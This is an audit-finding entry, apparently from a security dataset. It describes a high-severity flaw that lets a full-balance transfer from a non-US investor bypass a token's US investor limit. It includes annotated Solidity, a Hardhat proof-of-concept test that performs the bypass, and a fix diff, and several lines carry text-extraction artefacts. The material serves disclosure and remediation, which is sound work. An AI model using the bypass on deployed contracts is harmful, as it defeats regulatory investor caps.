# [H] US Investor Limit Bypass Vulnerability

## Summary
Severity: High
Contest weight: 0.0000
Dataset id: 23430
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
ComplianceServiceLibrary.completeTransferCheck() runs a list of validations to prevent investor limits (regional and global) from being bypassed in case the recipient of the transfer is a new investor and the number of investors has reached the limit.  
When validating the usInvestorsLimit, it is not validated whether the sender's region is also the US.  
This means that transferring all the investor balance of a non-US investor will bypass the usInvestorsLimit.  

Thanks to bypassing the check on ComplianceServiceRegulated.completeTransferCheck() (as explained in the snippet below), the usInvestorLimit will be increased on the ComplianceServiceRegulated.adjustInvestorsCountsByCountry(), which is called from the ComplianceServiceRegulated.recordTransfer() to increase the investor's counters because the to recipient is a new investor (execution flow explained in the second snippet).

```solidity
//completeTransferCheck()//
} else if (toRegion == US) {
    ...
    uint256 usInvestorsLimit = getUSInvestorsLimit(_services);
    if (
        usInvestorsLimit != 0 &&
//@audit-info => Transferring the full balance turns out the entire conditional to evaluate to false
//@audit => A single false on any of the individual conditions causes all of the conditions to evaluate to
false because all of them are &&,!
        _args.fromInvestorBalance > _args.value &&
        ComplianceServiceRegulated(_services[COMPLIANCE_SERVICE]).getUSInvestorsCount() >=
        usInvestorsLimit &&,!
        isNewInvestor(toInvestorBalance)
    ) {
        return (40, MAX_INVESTORS_IN_CATEGORY);
    }
    ...
}
```

```solidity
//ComplianceServiceRegulated.sol//
function recordTransfer(
    address _from,
    address _to,
    uint256 _value
) internal override returns (bool) {
//@audit => The `to` recipient is a new investor, therefore, calls adjustTransferCounts to increase the
counters,!
//@audit => `to` investor is a us investor, therefore, the usInvestorLimit will be incremented
    if (compareInvestorBalance(_to, _value, 0)) {
        adjustTransferCounts(_to, CommonUtils.IncDec.Increase);
    }
//@audit => `from` investor is not a us investor
//@audit-info => The usInvestorLimit won't be decremented here, it will be decremented the counter of
the from investor's region,!
    if (compareInvestorBalance(_from, _value, _value)) {
        adjustTotalInvestorsCounts(_from, CommonUtils.IncDec.Decrease);
    }
    cleanupInvestorIssuances(_from);
    cleanupInvestorIssuances(_to);
    return true;
}
```

## Proof of Concept
```javascript
describe('US Investor Limit Bypass Vulnerability POC', function() {
it('Should demonstrate that US investor limit can be bypassed with full transfer from any country',
async function() {,!
const [usInvestor1, usInvestor2, nonUsInvestor] = await hre.ethers.getSigners();
const { dsToken, registryService, complianceConfigurationService, complianceService } = await
loadFixture(deployDSTokenRegulatedWithRebasingAndEighteenDecimal);,!
// Setup: US limit = 1, disable other limits
await complianceConfigurationService.setAll(
[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 150, 1, 1, 0], // No other limits, short lock period
[false, false, false, false, false] // Disable all compliance checks initially
);
await complianceConfigurationService.setUSInvestorsLimit(1);// set one investor limit for us
investor,!
await complianceConfigurationService.setBlockFlowbackEndTime(1); // Disable flowback restriction
await complianceConfigurationService.setCountryCompliance(INVESTORS.Country.USA,
INVESTORS.Compliance.US);,!
await complianceConfigurationService.setCountryCompliance(INVESTORS.Country.GERMANY,
INVESTORS.Compliance.EU);,!
await registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_1, usInvestor1.address, registryService);
await registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_2, usInvestor2.address, registryService);
await registerInvestor(INVESTORS.INVESTOR_ID.GERMANY_INVESTOR_ID, nonUsInvestor.address,
registryService);,!
await registryService.setCountry(INVESTORS.INVESTOR_ID.INVESTOR_ID_1, INVESTORS.Country.USA);
await registryService.setCountry(INVESTORS.INVESTOR_ID.INVESTOR_ID_2, INVESTORS.Country.USA);
await registryService.setCountry(INVESTORS.INVESTOR_ID.GERMANY_INVESTOR_ID,
INVESTORS.Country.GERMANY);,!
// Issue tokens to non-US investor first
await dsToken.issueTokens(nonUsInvestor.address, 1000);
console.log('Non-US investor count:', await complianceService.getUSInvestorsCount());
// Issue tokens to first US investor (reaches limit)
await dsToken.issueTokens(usInvestor1.address, 1000);
console.log('After US investor count:', await complianceService.getUSInvestorsCount());
expect(await complianceService.getUSInvestorsCount()).to.equal(1);
// Direct issuance to second US investor should fail
await expect(dsToken.issueTokens(usInvestor2.address, 100))
.to.be.revertedWith('Max investors in category');
// VULNERABILITY: Non-US investor can bypass US limit with full transfer
// This should be blocked but isn't due to missing country check in US logic
await dsToken.connect(nonUsInvestor).transfer(usInvestor2.address, 1000);
// Verify bypass succeeded - usInvestor2 now has tokens despite limit being reached
expect(await dsToken.balanceOf(usInvestor2.address)).to.equal(1000);
35
expect(await dsToken.balanceOf(nonUsInvestor.address)).to.equal(0);
expect(await complianceService.getUSInvestorsCount()).to.equal(2);
});
});
```

## Recommendation
Consider updating the conditionals to evaluate to true when the sender (from) investor is not a US investor, or when it is a US investor and is not transferring all of its balance; if it's transferring all of its balance, the from investor would be decremented from the usInvestorLimit.

```diff
} else if (toRegion == US) {
    ...
    uint256 usInvestorsLimit = getUSInvestorsLimit(_services);
    if (
        usInvestorsLimit != 0 &&
-       _args.fromInvestorBalance > _args.value &&
+       (_args.fromRegion != US || _args.fromInvestorBalance > _args.value) &&
        ComplianceServiceRegulated(_services[COMPLIANCE_SERVICE]).getUSInvestorsCount() >=
        usInvestorsLimit &&,!
        isNewInvestor(toInvestorBalance)
    ) {
        return (40, MAX_INVESTORS_IN_CATEGORY);
    }
    ...
}
```
